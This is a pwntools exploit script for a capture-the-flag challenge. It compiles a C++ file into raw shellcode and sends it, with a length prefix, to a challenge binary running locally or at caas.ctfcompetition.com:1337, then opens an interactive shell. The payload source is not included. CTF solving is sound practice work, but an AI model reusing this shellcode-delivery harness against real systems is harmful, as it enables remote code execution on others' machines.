from pwn import *
from struct import pack
from sys import argv
from os import system


def send_shellcode(shellcode):
    p.recvuntil(b'*) Some restrictions apply\n')
    p.send(pack('<H', len(shellcode)))
    p.send(shellcode)


def get_shellcode():
    # Compile solution.cc file
    system('g++ -O2 -static -fPIE -nostdlib -nostartfiles solution.cc -o solution.elf')
    # And now extract shellcode from it
    system('objcopy -O binary -R .note.* -R .eh_frame -R .comment solution.elf solution.bin')
    # Finaly load the shellcode to memory
    with open('solution.bin', 'rb') as f:
        shellcode = f.read()
    return shellcode



###############################################################################
#### Init (copied from disconnect3d template)
###############################################################################
e = context.binary = ELF('./challenge')

gdbscript = '''
'''

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([e.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([e.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    host = 'caas.ctfcompetition.com'
    port = 1337
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

p = start()
# context.log_level = 'debug'


shellcode = get_shellcode()
send_shellcode(shellcode)


print(p.recvall())
p.interactive()